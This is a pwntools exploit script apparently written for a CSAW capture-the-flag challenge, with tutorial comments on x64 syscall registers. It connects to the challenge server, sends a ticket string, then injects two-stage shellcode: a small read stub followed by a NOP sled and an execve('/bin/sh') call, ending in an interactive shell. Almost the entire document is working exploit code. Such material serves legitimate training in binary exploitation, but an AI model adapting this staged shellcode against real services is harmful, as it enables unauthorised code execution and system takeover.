from pwn import *
import sys

context.log_level='debug'
# p = process("/all/chal1")
io = remote("how2pwn.chal.csaw.io", 60002)
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# gdb.attach(p) # attach to debug, don't forget to run "tmux" before running the script
# Tip: In x64, 
# rdi/rsi/rdx is the register to store the first/second/third parameter of a syscall
# rax is the syscall number, for example `mov rax,0 ; syscall` means calling read
# Also, the return value would be stored at rax

# There is a template of syscall(v1,v2,0,0)
# You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
# Your task is understanding and completing the shellcode

# And our goal is running exec("/bin/sh",0,0) to get a shell
# Make sure to hexify the arguments for shellcode!

v1 = 59
v2 = 29400045130965551

context.arch = 'amd64'

shellcode = '''
xor rdx, rdx
mov rdx, 0x80
syscall
'''

ret = io.recvuntil(b'o888o\n\n')
print(ret)
io.send(b"764fce03d863b5155db4af260374acc1")
ret = io.recvuntil(b': \n')
print(ret)
io.send(asm(shellcode).ljust(0x10, b'\x00'))

shellcode = '''
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
syscall 
'''

io.send(asm(shellcode).ljust(0x80,b'\0'))

io.interactive()
